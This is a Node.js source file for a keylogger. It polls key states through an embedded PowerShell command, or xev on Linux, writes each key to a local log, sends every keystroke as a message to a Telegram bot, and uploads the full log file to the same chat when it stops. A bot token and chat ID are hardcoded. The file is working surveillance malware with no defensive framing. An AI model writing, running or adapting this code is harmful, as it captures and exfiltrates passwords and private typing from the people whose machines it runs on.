const { exec } = require('child_process'); // To execute system commands
const axios = require('axios'); // For HTTP requests
const fs = require('fs'); // File system module
const path = require('path');

// Telegram Bot Token and Chat ID
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "7844704094:AAE2vlYePuWzezmPEVqoIZOaFM0aRqExFf0"; // Replace with your token
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6527763293"; // Replace with your chat ID
const LOG_FILE = path.join(__dirname, "keystrokes.log"); // Log file path

// Function to send text message to Telegram
async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: CHAT_ID,
      text: message,
    };
    const response = await axios.post(url, payload);
    if (response.status === 200) {
      console.log("Message sent to Telegram!");
    } else {
      console.error(`Failed to send message: ${response.status}`);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error.message);
  }
}

// Function to send file to Telegram
async function sendFileToTelegram() {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
    const formData = {
      chat_id: CHAT_ID,
      document: fs.createReadStream(LOG_FILE),
    };

    const response = await axios.post(url, formData, {
      headers: {
        "Content-Type": "multipart/form-data",
      },
    });

    if (response.status === 200) {
      console.log("Log file sent to Telegram!");
    } else {
      console.error(`Failed to send file: ${response.status}`);
    }
  } catch (error) {
    console.error("Error sending file to Telegram:", error.message);
  }
}

// Function to log keystrokes locally and to Telegram
function logKeystrokes(key) {
  const logEntry = `Key pressed: ${key}\n`;
  fs.appendFileSync(LOG_FILE, logEntry, "utf8");
  console.log(logEntry.trim());

  // Optional: Send every keystroke to Telegram
  sendToTelegram(logEntry.trim());
}

// Function to set up keylogger
function startKeylogger() {
  console.log("Starting keylogger...");
  console.log("Press Ctrl+C to stop.");

  const isWindows = process.platform === "win32";
  const command = isWindows
    ? "powershell -Command Add-Type -TypeDefinition '[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int vKey);' -Namespace Util -Name Keyboard;while($true){for($i=1;$i -le 254;$i++){if([Util.Keyboard]::GetAsyncKeyState($i) -ne 0){echo ([char]$i)}}}"
    : "xev -event keyboard"; // For Linux/Mac, use xev or equivalent.

  const keylogger = exec(command);

  keylogger.stdout.on("data", (data) => {
    logKeystrokes(data.trim());
  });

  keylogger.stderr.on("data", (data) => {
    console.error(`Error: ${data}`);
  });

  keylogger.on("close", (code) => {
    console.log(`Keylogger stopped with code ${code}`);
    // Send the log file to Telegram
    sendFileToTelegram();
  });
}

// Start the keylogger
startKeylogger();
